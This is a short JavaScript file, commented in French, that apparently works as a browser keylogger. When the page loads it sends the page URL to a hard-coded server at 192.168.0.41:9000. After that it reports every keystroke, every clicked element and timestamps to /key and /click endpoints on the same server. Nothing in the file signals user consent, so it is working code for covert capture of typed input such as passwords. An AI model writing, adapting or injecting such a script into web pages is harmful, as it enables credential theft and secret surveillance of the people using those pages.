const serv = "192.168.0.41:9000";

function getUrl() {
    const currentUrl = window.location.href;

    const data = {
        url: currentUrl
    };

    fetch(`https://${serv}/url`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.text())
    .then(responseText => {
        console.log('Réponse du serveur :', responseText);
    })
    .catch(error => {
        console.error('Erreur lors de l\'envoi des données :', error);
    });
}

getUrl();

document.addEventListener('keydown', (e) => {
    const currentUrl = window.location.href;

    const data = {
        url: currentUrl,
        key: e.key,
        time: new Date()
    };

    fetch(`https://${serv}/key`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.text())
    .then(responseText => {
        console.log('Réponse du serveur :', responseText);
    })
    .catch(error => {
        console.error('Erreur lors de l\'envoi des données :', error);
    });
});

document.addEventListener('click', (e) => {
    const currentUrl = window.location.href;

    const elementInfo = {
        tagName: e.target.tagName,
        id: e.target.id,
        classList: Array.from(e.target.classList)
    };

    const data = {
        url: currentUrl,
        target: elementInfo,
        time: new Date()
    };

    fetch(`https://${serv}/click`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.text())
    .then(responseText => {
        console.log('Réponse du serveur :', responseText);
    })
    .catch(error => {
        console.error('Erreur lors de l\'envoi des données :', error);
    });
});
